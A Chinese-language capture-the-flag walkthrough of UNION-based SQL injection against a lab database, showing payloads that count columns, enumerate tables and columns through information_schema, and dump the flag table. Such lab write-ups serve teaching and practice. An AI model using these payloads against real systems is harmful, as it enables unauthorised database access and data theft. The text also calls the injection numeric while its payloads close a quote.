## 联合注入

输入数值查询

![](https://pic1.imgdb.cn/item/682ad95c58cb8da5c8fbd7e2.jpg)

判断类型，加个单引号闭合没有回显

![](https://pic1.imgdb.cn/item/682ad9f158cb8da5c8fbd848.jpg)

再跟上永真条件加注释符测试得出类型是数字型

![](https://pic1.imgdb.cn/item/682ada0358cb8da5c8fbd849.jpg)

利用 `order by` 判断列数，这里试出为 4 列

```sql
1' order by 4 #
```

![](https://pic1.imgdb.cn/item/682adb3f58cb8da5c8fbd8e5.jpg)

接下来利用 `union` 构造查询语句

我们需要将 1 改为 -1 使其为假没有回显内容，则后台将返回第二个 `select` 语句的结果集

```sql
-1' union select 1,2,3,4 #
```

![](https://pic1.imgdb.cn/item/682adb8b58cb8da5c8fbd90f.jpg)

利用这个语句查询数据库名，使用函数 `database()`

```sql
-1' union select 1,2,3,database() #
```

![](https://pic1.imgdb.cn/item/682adbf258cb8da5c8fbd987.jpg)

有了库名接下来去查有哪些表

`information_schema.tables` 是一个特殊的数据库

它包含了所有其他数据库的元数据，如表结构、列信息、索引等

`table_schema` 则是数据库名，要考虑显示区域有限，使用 `group_concat()` 函数

它将所有表名合并成一个单一的字符串，每个表名之间用逗号分隔

```sql
-1' union select 1,2,3,group_concat(table_name) from information_schema.tables where table_schema='skctf' #
```

![](https://pic1.imgdb.cn/item/682adc3358cb8da5c8fbd9c9.jpg)

有个 `fl4g` 的表，去查询列名

```sql
-1' union select 1,2,3,group_concat(column_name) from information_schema.columns where table_name='fl4g' #
```

![](https://pic1.imgdb.cn/item/682adcca58cb8da5c8fbda2c.jpg)

最后查询我们想要的数据

```sql
-1' union select 1,2,3,group_concat(skctf_flag) from fl4g #
```

![](https://pic1.imgdb.cn/item/682ae15658cb8da5c8fbdd83.jpg)
